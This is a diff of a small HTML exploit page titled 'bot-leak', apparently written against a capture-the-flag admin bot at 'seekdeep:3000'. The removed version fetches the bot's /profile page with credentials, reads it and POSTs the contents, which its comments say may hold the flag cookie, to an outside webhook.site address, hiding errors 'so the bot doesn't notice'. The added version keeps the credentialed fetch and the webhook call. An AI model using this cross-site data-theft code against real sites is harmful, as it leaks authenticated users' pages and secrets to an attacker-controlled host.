@@ -2,38 +2,15 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>bot‑leak</title>
+<title>bot1‑leak</title>
 </head>
 <body>
 <script>
-// ------------- configuration -------------
 const WEBHOOK = "https://webhook.site/1f9b4f19-2450-4597-88a2-f1f2a4440af4";
-// -----------------------------------------
 
-(async () => {
-  try {
-    /* 1⃣  Make *any* same‑origin request first.  This guarantees the browser
-           attaches the flag cookie to subsequent requests. */
-    await fetch("http://seekdeep:3000/", { credentials: "include" });
-
-    /* 2⃣  Pull something that is sure to be readable (HTML, JSON, whatever).
-           `/profile` is just an example; pick a page that exists. */
-    const resp  = await fetch("http://seekdeep:3000/profile", { credentials: "include" });
-    const page  = await resp.text();
-
-    /* 3⃣  Forward the captured text to your webhook.
-           `mode:"no-cors"` skips the CORS pre‑flight and lets the request fire
-           even though the browser won’t expose the response to us. */
-    await fetch(WEBHOOK, {
-      method: "POST",
-      mode:   "no-cors",
-      body:   page               // <-- contains the cookie somewhere, or any
-                                 //      other sensitive data you needed
-    });
-  } catch (e) {
-    /* Swallow errors so the bot doesn’t notice. */
-  }
-})();
+fetch("http://seekdeep:3000/profile", { credentials: "include", mode:"no-cors" })
+  .then(() => fetch(WEBHOOK, { mode:"no-cors" }));   // fire‑and‑forget
 </script>
+
 </body>
 </html>
